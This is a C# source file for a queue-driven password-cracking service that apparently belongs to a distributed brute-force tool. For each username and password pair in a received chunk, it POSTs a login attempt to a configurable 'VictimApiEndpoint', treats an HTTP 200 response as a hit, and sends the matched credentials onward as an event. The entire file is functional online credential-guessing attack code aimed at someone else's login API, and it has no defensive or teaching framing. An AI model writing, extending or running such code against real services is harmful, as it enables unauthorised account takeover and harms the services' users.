using MassTransit;
using Newtonsoft.Json;
using QueueMessageTypes;
using System.Net;
using System.Text;

namespace QueueConsumer.Operations
{
    public class PasswordCrackingService
    {
        private readonly IBus _bus;
        private readonly HttpClient _client;

        public PasswordCrackingService(IBus bus) {
            _bus = bus;
            _client = new HttpClient();
        }
    
        public async Task ProcessChunk(PasswordsChunk chunk)
        {
            foreach(var user in chunk.Usernames)
            {
                foreach(var password in chunk.Passwords)
                {
                    var isValid = await ProcessCombination(user, password, chunk.Options);
                    if(isValid)
                    {
                        var eventMatched = BuildEvent(user, password, chunk.Options);
                        await _bus.Send(eventMatched);
                    }
                }
            }
        }
        
        private async Task<bool> ProcessCombination(string user, string password, PasswordCrackingOptions options)
        {
            var json = JsonConvert.SerializeObject(new { Username = user, Password = password});
            var request = new StringContent(json, Encoding.UTF8, "application/json");
            var response = await _client.PostAsync(options.VictimApiEndpoint, request);

            
            if(response.StatusCode == HttpStatusCode.OK)
            {
                return true;
            }
            return false;
        }

        private PasswordMatchedEvent BuildEvent(string user, string password, PasswordCrackingOptions options)
        {
            return new PasswordMatchedEvent
            {
                Username = user,
                Password = password,
                ApiEndpoint = options.VictimApiEndpoint
            };
        }
    }
}
